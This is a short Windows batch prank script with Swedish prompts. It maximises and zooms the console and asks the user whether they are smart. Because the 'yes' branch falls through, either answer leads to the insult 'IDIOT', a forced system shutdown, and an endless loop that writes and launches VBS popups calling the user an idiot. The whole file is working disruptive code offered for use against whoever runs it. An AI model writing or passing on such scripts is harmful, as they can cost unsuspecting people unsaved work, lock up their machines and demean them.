@echo off
:: Run PowerShell to simulate F11 key press
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F11}')"

color 9

powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"

cls

:ask
echo Är du smart? (Ja=J/ eller Nej=N/)
choice /c JN /m "Svara: "

:: Check response
if errorlevel 2 goto SvarNej
if errorlevel 1 goto SvarJa

:SvarJa
cls
echo vad bra :) 
echo Men du skulle inte svarat :)
pause




:SvarNej
color 4
cls
Echo IDIOT IDIOT IDIOT :)
timeout /t 1 >nul
shutdown /s
timeout /t 1 >nul

:loop
Color 07
color 40
color 07
color 40
@echo off
echo Set objShell = CreateObject("WScript.Shell") > %temp%\popup.vbs
echo objShell.Popup "IDIOT", 10, "ERROR", 64 >> %temp%\popup.vbs
start %temp%\popup.vbs
goto loop
